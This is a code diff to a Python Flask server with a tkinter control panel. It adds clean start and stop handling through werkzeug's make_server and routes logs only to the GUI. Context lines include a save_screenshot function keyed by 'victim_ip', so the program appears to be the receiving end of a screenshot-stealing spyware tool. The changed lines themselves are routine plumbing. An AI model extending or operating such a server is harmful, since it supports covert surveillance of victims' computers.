@@ -7,9 +7,13 @@ from datetime import datetime
 from flask import Flask, request, jsonify
 import tkinter as tk
 from tkinter import scrolledtext, ttk
+from werkzeug.serving import make_server
 
 # Flask app setup
 app = Flask(__name__)
+
+# Global variable to manage server state
+server = None
 
 # Configure logging
 logger = logging.getLogger()
@@ -93,7 +97,16 @@ def save_screenshot(base64_data, victim_ip):
         file.write(image_data)
 
 def run_flask():
-    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+    global server
+    server = make_server('0.0.0.0', 8080, app)
+    server.serve_forever()
+
+def stop_flask():
+    global server
+    if server:
+        server.shutdown()
+        server.server_close()
+        server = None
 
 # GUI Setup
 class ServerGUI:
@@ -120,6 +133,11 @@ class ServerGUI:
         self.gui_handler = GUIHandler(self.log_text)
         self.gui_handler.addFilter(FilterFlaskLogs())
         logger.addHandler(self.gui_handler)  # Add the GUI handler to the root logger
+
+        # Remove default terminal handlers
+        for handler in logger.handlers[:]:
+            if isinstance(handler, logging.StreamHandler):
+                logger.removeHandler(handler)
 
         # Control Tab
         self.control_frame = ttk.Frame(self.notebook)
@@ -148,6 +166,7 @@ class ServerGUI:
 
     def stop_server(self):
         if self.server_running:
+            stop_flask()
             self.server_running = False
             self.start_button.config(state=tk.NORMAL)
             self.stop_button.config(state=tk.DISABLED)
